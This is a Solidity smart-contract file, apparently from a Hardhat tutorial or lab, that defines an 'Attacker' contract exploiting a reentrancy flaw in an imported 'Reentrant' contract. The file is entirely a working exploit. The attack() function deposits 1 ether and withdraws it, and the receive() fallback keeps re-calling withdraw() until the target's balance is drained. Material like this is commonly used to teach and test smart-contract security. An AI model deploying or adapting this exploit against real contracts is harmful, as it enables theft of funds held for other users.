// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import './Reentrant.sol';
import 'hardhat/console.sol';

contract Attacker {
Reentrant public reentrant;

    constructor(address _etherStoreAddress) public {
        reentrant = Reentrant(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    receive() external payable {
        console.log(address(reentrant).balance);
        if (address(reentrant).balance >= 1 ether) {
            console.log(address(reentrant).balance);
            reentrant.withdraw();
        }
    }

    function attack() external payable {
        require(this.getBalance() >= 1 ether, 'need to send at least 1 ether');
        reentrant.deposit.value(1 ether)();
        reentrant.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}